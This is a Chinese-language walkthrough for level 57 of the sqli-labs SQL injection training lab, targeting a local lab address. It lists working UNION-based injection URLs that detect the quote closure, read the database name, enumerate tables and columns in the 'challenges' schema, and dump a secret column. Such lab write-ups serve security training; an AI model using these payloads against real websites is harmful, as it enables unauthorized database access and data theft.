---
title: Less - 57
date: 2023-03-24T19:16:13Z
lastmod: 2023-03-24T19:25:43Z
---

# Less - 57

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-57/?id=1' #页面正常
http://192.168.23.128/sqli-labs/Less-57/?id=1" #页面出错
http://192.168.23.128/sqli-labs/Less-57/?id=1"--+ #页面正常
```

​![image](assets/image-20230324191926-8cke431.png)​

所以判断闭合方式为"–+，并且为字符型注入

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-57/?id=-1" union select 1,2,database()--+
```

​![image](assets/image-20230324192011-38jk4cg.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-57/?id=-1" union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')--+
```

​![image](assets/image-20230324192140-jjoo55a.png)​

---

## 4、查看juu9c76ro4字段下的所有值

---

```http
http://192.168.23.128/sqli-labs/Less-57/?id=-1" union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='juu9c76ro4')--+
```

​![image](assets/image-20230324192346-ifgzgt2.png)​

---

## 5、查看secret_WHMS字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-57/?id=-1" union select 1,2,(select group_concat(secret_WHMS) from challenges.juu9c76ro4)--+
```

​![image](assets/image-20230324192505-ufvdy4i.png)​

​![image](assets/image-20230324192541-ed4144b.png)​

‍

---
